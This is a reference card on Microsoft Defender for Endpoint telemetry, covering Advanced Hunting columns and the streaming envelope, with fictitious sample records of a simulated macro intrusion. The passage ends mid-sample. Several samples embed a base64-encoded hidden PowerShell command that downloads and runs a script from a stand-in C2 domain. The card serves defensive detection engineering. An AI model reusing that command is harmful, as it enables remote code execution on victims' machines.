# EDR — Microsoft Defender for Endpoint (MDE, part of Defender XDR)

Category: EDR · Vendor: Microsoft · Card status: researched 2026-10-01

MDE telemetry is natively a set of **Advanced Hunting tables** (`DeviceProcessEvents`, `DeviceNetworkEvents`,
`DeviceFileEvents`, `DeviceEvents`, `DeviceLogonEvents`, `DeviceRegistryEvents`, `AlertInfo`, `AlertEvidence`, …).
The only native *export* of those rows is the **Defender XDR Streaming API** (to Event Hub or Storage), which wraps
each row in a small envelope. That envelope + the untouched table columns is the representation this platform uses.

---

## 1. Official / primary sources consulted

| URL | What it confirmed |
|---|---|
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table | Full DeviceProcessEvents column list + types (`Timestamp`, `DeviceId`, `DeviceName`, `ActionType`, `FileName`, `FolderPath`, `SHA1`, `SHA256`, `MD5`, `ProcessId`, `ProcessCommandLine`, `ProcessIntegrityLevel`, `ProcessTokenElevation` values, `InitiatingProcess*`, `ReportId`, `AdditionalFields`, `ProcessUniqueId`, `InitiatingProcessUniqueId`, session/RDP columns). Note: SHA256 "usually not populated — use SHA1" |
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table | DeviceNetworkEvents columns (`RemoteIP`, `RemotePort`, `RemoteUrl`, `LocalIP`, `LocalPort`, `Protocol`, `LocalIPType`/`RemoteIPType` values Public/Private/Reserved/Loopback/Teredo/FourToSixMapping/Broadcast) |
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table | DeviceFileEvents columns (`FileOriginUrl`, `FileOriginReferrerUrl`, `FileOriginIP`, `PreviousFileName`, `PreviousFolderPath`, `RequestProtocol` = Unknown/Local/SMB/NFS, `RequestSourceIP`, `RequestAccountName`, `ShareName`, `SensitivityLabel`) |
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table | DeviceLogonEvents columns, `LogonType` values (Interactive, RemoteInteractive, Network, Batch, Service), `FailureReason`, `IsLocalAdmin`, token-context keys in `AdditionalFields` |
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-alertinfo-table | AlertInfo columns: `Timestamp`, `AlertId`, `Title`, `Category`, `Severity`, `ServiceSource`, `DetectionSource`, `AttackTechniques`; join to AlertEvidence on `AlertId` |
| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-alertevidence-table | AlertEvidence columns (`EntityType`, `EvidenceRole`, `EvidenceDirection`, `FileName`, `FolderPath`, `SHA1`, `SHA256`, `RemoteIP`, `RemoteUrl`, `Account*`, `DeviceId`, `DeviceName`, `ProcessCommandLine`, `Registry*`, `AdditionalFields`, `Severity`, cloud columns) |
| https://learn.microsoft.com/en-us/defender-xdr/streaming-api-event-hub | Streaming envelope: Event Hub message = `{"records":[ ... ]}`; each record has `time` (time Defender received the event), `tenantId`, `category` = table name with `AdvancedHunting-` prefix, `properties` = the AH row as JSON; every row decorated with `MachineGroup` |
| https://learn.microsoft.com/en-us/defender-xdr/supported-event-types | Streaming support: AlertInfo, AlertEvidence, DeviceEvents, DeviceFileEvents, DeviceLogonEvents, DeviceNetworkEvents, DeviceProcessEvents, DeviceRegistryEvents, DeviceInfo, DeviceImageLoadEvents… = GA. Only GA columns are streamed |
| https://github.com/elastic/integrations/blob/main/packages/m365_defender/data_stream/event/_dev/test/pipeline/test-device.log and `test-alert.log` | Raw streamed records as received: also carry `"operationName":"Publish"`, `"Tenant":"DefaultTenant"`, sometimes `"_TimeReceivedBySvc"`; `Timestamp` with 7 fractional digits; `FolderPath` includes the file name; `AdditionalFields` is a JSON **string**; ActionType values seen: `ProcessCreated`, `ConnectionSuccess`, `NetworkSignatureInspected`, `DnsConnectionInspected`, `IcmpConnectionInspected`, `FileCreated`, `FileModified`, `LogonSuccess`, `LogonFailed`, `RegistryValueSet`, `RegistryKeyDeleted`, `ImageLoaded`, `PowerShellCommand`, `NamedPipeEvent`, `OpenProcessApiCall`, `DpapiAccessed`, `ScreenshotTaken`, `GetClipboardData`, `DriverLoad`; AlertId format `da<18 digits>_<signed int>`; ServiceSource `Microsoft Defender for Endpoint`, DetectionSource `EDR` |
| https://github.com/alexverboon/MDATP/blob/master/AdvancedHunting/T1071.004%20-%20Application%20Layer%20Protocol%20-%20DNS.md + https://github.com/MicrosoftDocs/defender-docs/blob/public/defender-xdr/advanced-hunting-deviceevents-table.md | DNS client telemetry = `DeviceEvents` with `ActionType == "DnsQueryResponse"`; `AdditionalFields` keys `DnsQueryString` and `DnsQueryResult` (array of objects with `DnsQueryType`, `Result`) |

---

## 2. Native format & delivery path

1. Sensor (`MsSense`) → Defender cloud → rows land in the Advanced Hunting tables (queried with KQL in the Defender
   portal, `security.microsoft.com` → Hunting → Advanced hunting).
2. **Streaming API** (Settings → Microsoft Defender XDR → Streaming API) forwards rows to Azure Event Hub or a
   Storage Account. Each Event Hub message body:

```text
{"records":[{"time":"<receive time>","tenantId":"<guid>","operationName":"Publish","category":"AdvancedHunting-<Table>","properties":{ <AH row> }}]}
```

3. The Microsoft Sentinel Defender XDR connector lands the same columns into Log Analytics tables of the same name
   (`DeviceProcessEvents` etc., adds `TimeGenerated`, `TenantId`, `Type`, `SourceSystem` — those are Log Analytics
   columns, not MDE columns).

**We standardise on the streaming record** (one element of `records[]`): envelope keys exactly as streamed and
`properties` = untouched AH columns. Reason: it is the only Microsoft-defined export of the raw rows and it is
what SIEMs actually receive. Samples below show one record each; sample 4.1 also shows the `records` wrapper.

Alerts: rendered as `AlertInfo` + `AlertEvidence` streamed records (same envelope). The Graph `alerts_v2`
object and the legacy MDE `/api/alerts` object are different schemas (camelCase) — see the separate MS Graph card;
never mix them into an AH record.

---

## 3. Core field reference

### 3a. Streaming envelope

| Field | Type | Meaning | Example |
|---|---|---|---|
| `time` | string ISO-8601 (7 fractional digits) | When Defender received the event | `2026-09-29T08:14:41.7712090Z` |
| `tenantId` | string GUID | Entra tenant | `7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17` |
| `operationName` | string | Always `Publish` (observed; not in current doc example) | `Publish` |
| `category` | string | `AdvancedHunting-` + table name | `AdvancedHunting-DeviceProcessEvents` |
| `properties` | object | The AH row | |
| `Tenant` | string | Observed `DefaultTenant` (not documented) | |
| `_TimeReceivedBySvc` | string | Observed on some records (not documented) | |

### 3b. Columns shared by Device* tables

| Column | Type | Meaning / values |
|---|---|---|
| `Timestamp` | datetime (`...Z`, 7 digits) | Event time on device |
| `DeviceId` | string (40 hex) | Defender machine ID |
| `DeviceName` | string | FQDN, lower-case typical (`fin-ws-0142.nexacorp.local`) |
| `ActionType` | string | See per-table list |
| `ReportId` | long | Per-device counter; unique only with `DeviceName`+`Timestamp` |
| `AdditionalFields` | string (JSON text) or null | Extra keys; **string**, not object |
| `AppGuardContainerId` | string/null | |
| `MachineGroup` | string | Device group decoration added by streaming |
| `InitiatingProcessFileName`, `InitiatingProcessFolderPath`, `InitiatingProcessCommandLine`, `InitiatingProcessId`, `InitiatingProcessCreationTime`, `InitiatingProcessSHA1`, `InitiatingProcessSHA256`, `InitiatingProcessMD5`, `InitiatingProcessFileSize`, `InitiatingProcessVersionInfo*` (CompanyName, ProductName, ProductVersion, InternalFileName, OriginalFileName, FileDescription) | | The process that **caused** this row |
| `InitiatingProcessParentId`, `InitiatingProcessParentFileName`, `InitiatingProcessParentCreationTime` | | Its parent |
| `InitiatingProcessAccountDomain`, `InitiatingProcessAccountName`, `InitiatingProcessAccountSid`, `InitiatingProcessAccountUpn`, `InitiatingProcessAccountObjectId`, `InitiatingProcessLogonId` | | Account of the initiating process |
| `InitiatingProcessIntegrityLevel` | string | `Low`, `Medium`, `High`, `System` |
| `InitiatingProcessTokenElevation` / `ProcessTokenElevation` | string | `TokenElevationTypeDefault`, `TokenElevationTypeLimited`, `TokenElevationTypeFull`, `None` |
| `InitiatingProcessSignerType`, `InitiatingProcessSignatureStatus` (DeviceProcessEvents only) | string | e.g. `OsVendor`, `Valid` |
| `InitiatingProcessUniqueId`, `InitiatingProcessSessionId`, `IsInitiatingProcessRemoteSession`, `InitiatingProcessRemoteSessionDeviceName`, `InitiatingProcessRemoteSessionIP` | | Newer columns |

### 3c. Per-table key columns & ActionType values

| Table | Key columns | ActionType values (common) |
|---|---|---|
| DeviceProcessEvents | `FileName`, `FolderPath` (full path incl. file), `SHA1`, `SHA256`, `MD5`, `ProcessId`, `ProcessCommandLine`, `ProcessCreationTime`, `ProcessIntegrityLevel`, `ProcessTokenElevation`, `ProcessVersionInfo*`, `AccountDomain`, `AccountName`, `AccountSid`, `AccountUpn`, `AccountObjectId`, `LogonId`, `ProcessUniqueId`, `CreatedProcessSessionId` | `ProcessCreated` (also `OpenProcess` — **UNVERIFIED** in streamed data) |
| DeviceNetworkEvents | `RemoteIP`, `RemotePort`, `RemoteUrl`, `LocalIP`, `LocalPort`, `Protocol` (`Tcp`, `Udp`, `Icmp`…), `LocalIPType`, `RemoteIPType` | `ConnectionSuccess`, `ConnectionFailed`, `ConnectionRequest`, `ConnectionFound`, `InboundConnectionAccepted`, `ListeningConnectionCreated`, `NetworkSignatureInspected`, `DnsConnectionInspected`, `HttpConnectionInspected`, `SslConnectionInspected`, `IcmpConnectionInspected` (inspected-type names partly **UNVERIFIED** beyond those in samples) |
| DeviceFileEvents | `FileName`, `FolderPath`, `SHA1`, `SHA256`, `MD5`, `FileSize`, `FileOriginUrl`, `FileOriginReferrerUrl`, `FileOriginIP`, `PreviousFileName`, `PreviousFolderPath`, `RequestProtocol`, `RequestSourceIP`, `RequestSourcePort`, `RequestAccountName`, `RequestAccountDomain`, `RequestAccountSid`, `ShareName`, `SensitivityLabel`, `SensitivitySubLabel`, `IsAzureInfoProtectionApplied` | `FileCreated`, `FileModified`, `FileDeleted`, `FileRenamed` |
| DeviceEvents | `FileName`, `FolderPath`, `ProcessCommandLine`, `RemoteUrl`, `RemoteIP`, `RemotePort`, `LocalIP`, `RegistryKey`, `AccountName`, `AdditionalFields` | `DnsQueryResponse`, `PowerShellCommand`, `AntivirusDetection`, `ExploitGuardNetworkProtectionBlocked`, `AsrOfficeChildProcessBlocked`/`AsrOfficeChildProcessAudited`, `ScheduledTaskCreated`, `NamedPipeEvent`, `OpenProcessApiCall`, `CreateRemoteThreadApiCall`, `LdapSearch`, `UserAccountCreated`… |
| DeviceLogonEvents | `LogonType`, `AccountDomain`, `AccountName`, `AccountSid`, `Protocol` (`NTLM`, `Kerberos`…), `FailureReason` (`InvalidUserNameOrPassword`…), `IsLocalAdmin`, `LogonId`, `RemoteDeviceName`, `RemoteIP`, `RemoteIPType`, `RemotePort` | `LogonSuccess`, `LogonFailed`, `LogonAttempted` |
| DeviceRegistryEvents | `RegistryKey`, `RegistryValueName`, `RegistryValueData`, `RegistryValueType`, `PreviousRegistryKey`, `PreviousRegistryValueName`, `PreviousRegistryValueData` | `RegistryValueSet`, `RegistryKeyCreated`, `RegistryKeyDeleted`, `RegistryValueDeleted`, `RegistryKeyRenamed` |
| AlertInfo | `AlertId`, `Title`, `Category`, `Severity` (`High`, `Medium`, `Low`, `Informational`), `ServiceSource` (`Microsoft Defender for Endpoint`, …), `DetectionSource` (`EDR`, `Antivirus`, `Custom detection`, `Microsoft Defender XDR`…), `AttackTechniques` (JSON-array string) | n/a |
| AlertEvidence | `AlertId`, `EntityType` (`Process`, `File`, `Machine`, `User`, `Ip`, `Url`, `RegistryValue`, `MailMessage`…), `EvidenceRole` (`Impacted`, `Related`), `EvidenceDirection` (`Source`, `Destination`, null) + entity columns | n/a |

`Category` values follow MITRE-style single tokens — observed `Persistence`, `Execution`; others such as
`CommandAndControl`, `DefenseEvasion`, `CredentialAccess`, `LateralMovement`, `Malware`, `SuspiciousActivity`
are widely seen but **UNVERIFIED** against a Microsoft enum page. `DetectionSource` values beyond `EDR`,
`Antivirus` and the `EntityType` list beyond `File` are likewise **UNVERIFIED** (taken from portal usage).

---

## 4. Realistic JSON samples (fictitious)

Same story as the other EDR cards: `dana.levi` on `fin-ws-0142.nexacorp.local` opens a macro document; WINWORD
spawns encoded PowerShell → DNS → HTTPS to `cdn-update-sync.com` (185.225.73.41) → drops `msupd.exe`.

### 4.1 DeviceProcessEvents — ProcessCreated (shown inside the Event Hub `records` wrapper)

```json
{
  "records": [
    {
      "time": "2026-09-29T08:14:41.7712090Z",
      "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
      "operationName": "Publish",
      "category": "AdvancedHunting-DeviceProcessEvents",
      "properties": {
        "Timestamp": "2026-09-29T08:14:22.4023318Z",
        "DeviceId": "3f9a1c6e2b8d4f70a5e1c9b3d7f2a6e4c8b0d1f5",
        "DeviceName": "fin-ws-0142.nexacorp.local",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "SHA1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
        "SHA256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
        "MD5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
        "FileSize": 455680,
        "ProcessVersionInfoCompanyName": "Microsoft Corporation",
        "ProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
        "ProcessVersionInfoProductVersion": "10.0.26100.4652",
        "ProcessVersionInfoInternalFileName": "POWERSHELL",
        "ProcessVersionInfoOriginalFileName": "PowerShell.EXE.MUI",
        "ProcessVersionInfoFileDescription": "Windows PowerShell",
        "ProcessId": 7412,
        "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
        "ProcessIntegrityLevel": "Medium",
        "ProcessTokenElevation": "TokenElevationTypeLimited",
        "ProcessCreationTime": "2026-09-29T08:14:22.4019871Z",
        "AccountDomain": "nexacorp",
        "AccountName": "dana.levi",
        "AccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
        "AccountUpn": "dana.levi@nexacorp.com",
        "AccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
        "LogonId": 2338751,
        "InitiatingProcessAccountDomain": "nexacorp",
        "InitiatingProcessAccountName": "dana.levi",
        "InitiatingProcessAccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
        "InitiatingProcessAccountUpn": "dana.levi@nexacorp.com",
        "InitiatingProcessAccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
        "InitiatingProcessLogonId": 2338751,
        "InitiatingProcessIntegrityLevel": "Medium",
        "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
        "InitiatingProcessSHA1": "56acd2b8eef7bf2524bf0778a3830734dac894fe",
        "InitiatingProcessSHA256": "a80227f8606831d42d3535415b73721e08daf506051e2ec1ab7d4994d88780ca",
        "InitiatingProcessMD5": "b5427130eb0bcfc6bcbefd3d44f12104",
        "InitiatingProcessFileName": "WINWORD.EXE",
        "InitiatingProcessFileSize": 1623448,
        "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
        "InitiatingProcessVersionInfoProductName": "Microsoft Office",
        "InitiatingProcessVersionInfoProductVersion": "16.0.19127.20154",
        "InitiatingProcessVersionInfoInternalFileName": "WinWord",
        "InitiatingProcessVersionInfoOriginalFileName": "WinWord.exe",
        "InitiatingProcessVersionInfoFileDescription": "Microsoft Word",
        "InitiatingProcessId": 5216,
        "InitiatingProcessCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"",
        "InitiatingProcessCreationTime": "2026-09-29T08:11:05.1204417Z",
        "InitiatingProcessFolderPath": "c:\\program files\\microsoft office\\root\\office16\\winword.exe",
        "InitiatingProcessParentId": 4128,
        "InitiatingProcessParentFileName": "explorer.exe",
        "InitiatingProcessParentCreationTime": "2026-09-29T06:03:40.8817702Z",
        "InitiatingProcessSignerType": "ThirdParty",
        "InitiatingProcessSignatureStatus": "Valid",
        "ReportId": 48213,
        "AppGuardContainerId": null,
        "AdditionalFields": null,
        "InitiatingProcessSessionId": 1,
        "IsInitiatingProcessRemoteSession": false,
        "InitiatingProcessRemoteSessionDeviceName": null,
        "InitiatingProcessRemoteSessionIP": null,
        "CreatedProcessSessionId": 1,
        "IsProcessRemoteSession": false,
        "ProcessRemoteSessionDeviceName": null,
        "ProcessRemoteSessionIP": null,
        "ProcessUniqueId": "33495223187524",
        "InitiatingProcessUniqueId": "33495223149071",
        "MachineGroup": "Finance-Workstations"
      }
    }
  ]
}
```

### 4.2 DeviceEvents — DnsQueryResponse (PowerShell resolves C2)

```json
{
  "time": "2026-09-29T08:14:42.0310557Z",
  "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
  "operationName": "Publish",
  "category": "AdvancedHunting-DeviceEvents",
  "properties": {
    "Timestamp": "2026-09-29T08:14:23.0519021Z",
    "DeviceId": "3f9a1c6e2b8d4f70a5e1c9b3d7f2a6e4c8b0d1f5",
    "DeviceName": "fin-ws-0142.nexacorp.local",
    "ActionType": "DnsQueryResponse",
    "FileName": null,
    "FolderPath": null,
    "SHA1": null,
    "SHA256": null,
    "MD5": null,
    "FileSize": null,
    "AccountDomain": null,
    "AccountName": null,
    "AccountSid": null,
    "RemoteUrl": null,
    "RemoteDeviceName": null,
    "ProcessId": null,
    "ProcessCommandLine": null,
    "ProcessCreationTime": null,
    "ProcessTokenElevation": null,
    "LogonId": null,
    "RegistryKey": null,
    "RegistryValueName": null,
    "RegistryValueData": null,
    "RemoteIP": null,
    "RemotePort": null,
    "LocalIP": null,
    "LocalPort": null,
    "FileOriginUrl": null,
    "FileOriginIP": null,
    "InitiatingProcessSHA1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
    "InitiatingProcessSHA256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "InitiatingProcessMD5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
    "InitiatingProcessFileName": "powershell.exe",
    "InitiatingProcessFileSize": 455680,
    "InitiatingProcessFolderPath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
    "InitiatingProcessId": 7412,
    "InitiatingProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "InitiatingProcessCreationTime": "2026-09-29T08:14:22.4019871Z",
    "InitiatingProcessParentId": 5216,
    "InitiatingProcessParentFileName": "WINWORD.EXE",
    "InitiatingProcessParentCreationTime": "2026-09-29T08:11:05.1204417Z",
    "InitiatingProcessAccountDomain": "nexacorp",
    "InitiatingProcessAccountName": "dana.levi",
    "InitiatingProcessAccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "InitiatingProcessAccountUpn": "dana.levi@nexacorp.com",
    "InitiatingProcessAccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
    "InitiatingProcessLogonId": 2338751,
    "InitiatingProcessIntegrityLevel": "Medium",
    "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
    "ReportId": 48219,
    "AppGuardContainerId": null,
    "AdditionalFields": "{\"DnsQueryString\":\"cdn-update-sync.com\",\"DnsQueryResult\":[{\"DnsQueryType\":\"A\",\"Result\":\"185.225.73.41\"}]}",
    "MachineGroup": "Finance-Workstations"
  }
}
```

Note: the exact `DnsQueryType` string for an A record (`"A"`) and which process MDE attributes as
`InitiatingProcess*` for `DnsQueryResponse` are **UNVERIFIED** (the KQL source shows keys `DnsQueryType`/`Result` and a
`TEXT` example). Network-inspection DNS (`DeviceNetworkEvents` / `DnsConnectionInspected`) is the alternative: it
carries Zeek-style keys in `AdditionalFields` (`query`, `qtype_name`, `rcode_name`, `answers`, `direction`) and usually
no initiating process.

### 4.3 DeviceNetworkEvents — ConnectionSuccess (outbound to C2)

```json
{
  "time": "2026-09-29T08:14:42.2286134Z",
  "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
  "operationName": "Publish",
  "category": "AdvancedHunting-DeviceNetworkEvents",
  "properties": {
    "Timestamp": "2026-09-29T08:14:23.2127745Z",
    "DeviceId": "3f9a1c6e2b8d4f70a5e1c9b3d7f2a6e4c8b0d1f5",
    "DeviceName": "fin-ws-0142.nexacorp.local",
    "ActionType": "ConnectionSuccess",
    "RemoteIP": "185.225.73.41",
    "RemotePort": 443,
    "RemoteUrl": "cdn-update-sync.com",
    "LocalIP": "10.20.14.87",
    "LocalPort": 52817,
    "Protocol": "Tcp",
    "LocalIPType": "Private",
    "RemoteIPType": "Public",
    "InitiatingProcessSHA1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
    "InitiatingProcessSHA256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "InitiatingProcessMD5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
    "InitiatingProcessFileName": "powershell.exe",
    "InitiatingProcessFileSize": 455680,
    "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
    "InitiatingProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
    "InitiatingProcessVersionInfoProductVersion": "10.0.26100.4652",
    "InitiatingProcessVersionInfoInternalFileName": "POWERSHELL",
    "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.EXE.MUI",
    "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
    "InitiatingProcessId": 7412,
    "InitiatingProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "InitiatingProcessCreationTime": "2026-09-29T08:14:22.4019871Z",
    "InitiatingProcessFolderPath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
    "InitiatingProcessParentFileName": "WINWORD.EXE",
    "InitiatingProcessParentId": 5216,
    "InitiatingProcessParentCreationTime": "2026-09-29T08:11:05.1204417Z",
    "InitiatingProcessAccountDomain": "nexacorp",
    "InitiatingProcessAccountName": "dana.levi",
    "InitiatingProcessAccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "InitiatingProcessAccountUpn": "dana.levi@nexacorp.com",
    "InitiatingProcessAccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
    "InitiatingProcessIntegrityLevel": "Medium",
    "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
    "ReportId": 48221,
    "AppGuardContainerId": null,
    "AdditionalFields": null,
    "InitiatingProcessSessionId": 1,
    "IsInitiatingProcessRemoteSession": false,
    "InitiatingProcessRemoteSessionDeviceName": null,
    "InitiatingProcessRemoteSessionIP": null,
    "InitiatingProcessUniqueId": "33495223187524",
    "MachineGroup": "Finance-Workstations"
  }
}
```

### 4.4 DeviceFileEvents — FileCreated (dropped payload)

```json
{
  "time": "2026-09-29T08:14:44.9032718Z",
  "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
  "operationName": "Publish",
  "category": "AdvancedHunting-DeviceFileEvents",
  "properties": {
    "Timestamp": "2026-09-29T08:14:25.8806134Z",
    "DeviceId": "3f9a1c6e2b8d4f70a5e1c9b3d7f2a6e4c8b0d1f5",
    "DeviceName": "fin-ws-0142.nexacorp.local",
    "ActionType": "FileCreated",
    "FileName": "msupd.exe",
    "FolderPath": "C:\\ProgramData\\Microsoft\\Update\\msupd.exe",
    "SHA1": "25f6bb19be3498752f0665b33793b97780b82e0b",
    "SHA256": "e3375bf9704fd511dd71fdd683ae439adfa8b22e697c1853d148c8ae0e627aed",
    "MD5": "ee431d880f269d11fbee0a0dd7ed9fc3",
    "FileOriginUrl": null,
    "FileOriginReferrerUrl": null,
    "FileOriginIP": null,
    "PreviousFolderPath": null,
    "PreviousFileName": null,
    "FileSize": 318464,
    "InitiatingProcessAccountDomain": "nexacorp",
    "InitiatingProcessAccountName": "dana.levi",
    "InitiatingProcessAccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "InitiatingProcessAccountUpn": "dana.levi@nexacorp.com",
    "InitiatingProcessAccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
    "InitiatingProcessMD5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
    "InitiatingProcessSHA1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
    "InitiatingProcessSHA256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "InitiatingProcessFolderPath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
    "InitiatingProcessFileName": "powershell.exe",
    "InitiatingProcessFileSize": 455680,
    "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
    "InitiatingProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
    "InitiatingProcessVersionInfoProductVersion": "10.0.26100.4652",
    "InitiatingProcessVersionInfoInternalFileName": "POWERSHELL",
    "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.EXE.MUI",
    "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
    "InitiatingProcessId": 7412,
    "InitiatingProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "InitiatingProcessCreationTime": "2026-09-29T08:14:22.4019871Z",
    "InitiatingProcessIntegrityLevel": "Medium",
    "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
    "InitiatingProcessParentId": 5216,
    "InitiatingProcessParentFileName": "WINWORD.EXE",
    "InitiatingProcessParentCreationTime": "2026-09-29T08:11:05.1204417Z",
    "RequestProtocol": "Local",
    "RequestSourceIP": null,
    "RequestSourcePort": null,
    "RequestAccountName": "dana.levi",
    "RequestAccountDomain": "NEXACORP",
    "RequestAccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "ShareName": null,
    "SensitivityLabel": null,
    "SensitivitySubLabel": null,
    "IsAzureInfoProtectionApplied": null,
    "ReportId": 48230,
    "AppGuardContainerId": null,
    "AdditionalFields": null,
    "MachineGroup": "Finance-Workstations"
  }
}
```

(`FileOriginUrl` is populated from Mark-of-the-Web, typically for browser/Outlook downloads; a file written by a
PowerShell WebClient download usually has it empty — keep it null unless the story uses a browser.)

### 4.5 AlertInfo

```json
{
  "time": "2026-09-29T08:15:03.4417730Z",
  "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
  "operationName": "Publish",
  "category": "AdvancedHunting-AlertInfo",
  "properties": {
    "Timestamp": "2026-09-29T08:14:24.9351106Z",
    "AlertId": "da639262664649351106_-1180534512",
    "Title": "Suspicious PowerShell command line",
    "Category": "Execution",
    "Severity": "Medium",
    "ServiceSource": "Microsoft Defender for Endpoint",
    "DetectionSource": "EDR",
    "AttackTechniques": "[\"PowerShell (T1059.001)\",\"Obfuscated Files or Information (T1027)\"]",
    "MachineGroup": "Finance-Workstations"
  }
}
```

### 4.6 AlertEvidence — Process entity for the same alert

```json
{
  "time": "2026-09-29T08:15:03.4498214Z",
  "tenantId": "7c2f9e1a-4b3d-4e8f-9a61-2d5c8b0f3e17",
  "operationName": "Publish",
  "category": "AdvancedHunting-AlertEvidence",
  "properties": {
    "Timestamp": "2026-09-29T08:14:24.9351106Z",
    "AlertId": "da639262664649351106_-1180534512",
    "Title": "Suspicious PowerShell command line",
    "Categories": "[\"Execution\"]",
    "AttackTechniques": "[\"PowerShell (T1059.001)\",\"Obfuscated Files or Information (T1027)\"]",
    "ServiceSource": "Microsoft Defender for Endpoint",
    "DetectionSource": "EDR",
    "EntityType": "Process",
    "EvidenceRole": "Impacted",
    "EvidenceDirection": null,
    "FileName": "powershell.exe",
    "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
    "SHA1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
    "SHA256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "FileSize": 455680,
    "ThreatFamily": null,
    "RemoteIP": null,
    "RemoteUrl": null,
    "AccountName": "dana.levi",
    "AccountDomain": "nexacorp",
    "AccountSid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "AccountObjectId": "b41c7e9d-2f3a-4c85-9e6b-0d1a2f3b4c5d",
